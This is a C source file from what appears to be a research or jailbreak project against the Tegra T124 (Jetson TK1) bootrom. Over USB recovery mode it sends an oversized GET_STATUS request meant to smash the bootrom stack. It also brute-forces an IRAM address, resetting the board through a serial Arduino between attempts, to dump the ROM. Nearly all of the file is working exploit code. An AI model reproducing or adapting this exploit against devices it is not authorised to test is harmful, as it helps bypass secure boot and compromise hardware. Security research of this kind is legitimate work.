#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <termios.h>

#include "t124.h"
#include "rcm.h"
#include "mini_libusb.h"

void print_hex_memory( void *mem, size_t size ) {
  uint8_t *p = (uint8_t *)mem;
  for ( int i = 0; i < size ; i++ ) {
    if ( ( ( i % 16 ) == 0 ) && i )
      printf( "\n" );
    printf( "0x%02x ", p[i] );
  }
  printf( "\n" );
}

int test_usb_transport_add( uint32_t usb_transport_add ) {

    int _ret_main = -1;
    int rcm_usb = 0;

  // ---- INIT RCM ----

    printf( "Waiting T124 to enter RCM mode (ctrl-c to cancel). Note: root permission could be required.\n" );
    rcm_usb = usb_open_by_vid_pid( (uint16_t)JETSON_TK1_VID, (uint16_t)JETSON_TK1_PID, 1 );
    printf( "K1 in RCM mode connected.\n" );
    if ( rcm_usb < 0 ) {
        fprintf( stderr, "Error: Couldn't open the usb.\n" );
        goto exit;
    }

    uint8_t chip_id_buf[RCM_CHIP_ID_LEN];
    memset( &chip_id_buf, 0, sizeof(chip_id_buf) );

    int ret = usb_send_bulk_txn( rcm_usb, RCM_EP1_IN, RCM_CHIP_ID_LEN, chip_id_buf );
    if ( ret < 0 ) {
        fprintf( stderr, "Error: Couldn't read Chip ID. Please reset T124 in RCM mode again.\n" );
        goto exit;
    }
    printf( "Chip ID: " );
    print_hex_memory( chip_id_buf, RCM_CHIP_ID_LEN );

  //-----------------------


  // ---- SEND PAYLOAD ----
  
    ret = send_rcm_cmd(rcm_usb, usb_transport_add);
    if ( ret < 0 ) {
        printf( "Error: Couldn't send RCM CMD.\n" );
        goto exit;
    }

  //----------------------


  // ---- RUN EXPLOIT ----
  
    uint8_t data[BOOTROM_SMASH_LEN];
    ret = usb_send_control_txn( rcm_usb, USB_CTRL_DEVICE_ENDPOINT_TO_HOST,
            USB_CTRL_GET_STATUS, 0, 0, BOOTROM_SMASH_LEN, data, 500 );
    if ( ret == 0 ) {
        printf( "Error: Hacky Get Status finished correctly... Not cool :-(\n" );
//        print_hex_memory( data, sizeof(data) );
//        goto exit;
    }
    else
    printf( "Hacky Get Status returned error... Probably the stack got smashed, Congrats :-)\n" );

    //----------------------

    sleep(2);

    ret = usb_send_bulk_txn( rcm_usb, RCM_EP1_IN, 0x7, data );
    if ( ret < 0 ) {
        printf( "WOPS!!!!\n" );
        goto exit;
    }
    printf( "Data From Tegra: " );
    print_hex_memory( data, 0x7 );
  
    _ret_main = 0;

    
exit:
    if ( rcm_usb > 0 ) usb_close( rcm_usb );

    return _ret_main;

}

/* copied from https://stackoverflow.com/questions/6947413/how-to-open-read-and-write-from-serial-port-in-c */
int set_interface_attribs( int fd, int speed ) {
    struct termios tty;

    if ( tcgetattr( fd, &tty ) < 0 ) {
        printf( "Error from tcgetattr: %s\n", strerror( errno ) );
        return -1;
    }

    cfsetospeed( &tty, (speed_t) speed );
    cfsetispeed( &tty, (speed_t) speed );

    tty.c_cflag |= ( CLOCAL | CREAD );    /* ignore modem controls */
    tty.c_cflag &= ~CSIZE;
    tty.c_cflag |= CS8;         /* 8-bit characters */
    tty.c_cflag &= ~PARENB;     /* no parity bit */
    tty.c_cflag &= ~CSTOPB;     /* only need 1 stop bit */
    tty.c_cflag &= ~CRTSCTS;    /* no hardware flowcontrol */

    /* setup for non-canonical mode */
    tty.c_iflag &= ~( IGNBRK | BRKINT | PARMRK | ISTRIP | INLCR | IGNCR | ICRNL | IXON );
    tty.c_lflag &= ~( ECHO | ECHONL | ICANON | ISIG | IEXTEN );
    tty.c_oflag &= ~OPOST;

    /* fetch bytes as they become available */
    tty.c_cc[VMIN] = 1;
    tty.c_cc[VTIME] = 1;

    if ( tcsetattr( fd, TCSANOW, &tty ) != 0 ) {
        printf( "Error from tcsetattr: %s\n", strerror( errno ) );
        return -1;
    }
    return 0;
}

/* copied from https://stackoverflow.com/questions/6947413/how-to-open-read-and-write-from-serial-port-in-c */
int reset_t124( char *serial_path ) {

    int fd;
    int wlen;
    int _ret_main = -1;

    fd = open( serial_path, O_RDWR | O_NOCTTY | O_SYNC );
    if ( fd < 0 ) {
        printf( "Error opening %s: %s\n", serial_path, strerror( errno ) );
        goto exit;
    }
    /* baudrate 9600, 8 bits, no parity, 1 stop bit */
    set_interface_attribs( fd, B9600 );

    /* simple output */
    wlen = write( fd, "d\0", 2 );
    tcdrain( fd );    /* delay for output */
    if ( wlen != 2 ) {
        printf( "Error from write: %d, %d\n", wlen, errno );
        goto exit;
    }

    _ret_main = 0;

exit:
    if ( fd > 0 ) close( fd );

    return _ret_main;
}

int main( int argc, char *argv[] ) {

    printf( "Warning: This brach is intended to work with an arduino addon to reset the Jetson TK1 by console.\n"
            "The purpose of this branch is dump the bootroom or find the usb transport add.\n"
            "Please use the branch t124 for normal use.\n" );
//    uint32_t usb_transport_add = 0x00101401;
   // for ( uint32_t usb_transport_add = IRAM_BEGIN;
  //  for ( uint32_t usb_transport_add =   0x107000 - 0x108050; -> THUMB I dind't check for resets but there is no MSG EP1
  //  for ( uint32_t usb_transport_add =   0x101b2a; -> THUMB NO MSG in EP1 several normal boots.
  //  for ( uint32_t usb_transport_add =   0x100670;
  //  On 0x100624 there is a call to perform a normal boot... It doesn't wipe Upper IRAM.... who says rom dumper :-D?
    for ( uint32_t usb_transport_add = 0x101b2a;
        usb_transport_add < 0x0010FFFF;
        usb_transport_add += 2 ) {

        printf( "Trying: %x\n", usb_transport_add );
        
        if ( reset_t124( argv[1] ) ) break;
        usleep(2000000);

        if ( !test_usb_transport_add( usb_transport_add ) ) {
            printf( "Address Found: %x\n", usb_transport_add );
            return 0;
        }
        usleep(1000000);

    }

    printf( "Address not Found!!!\n" );

    return 0;

}

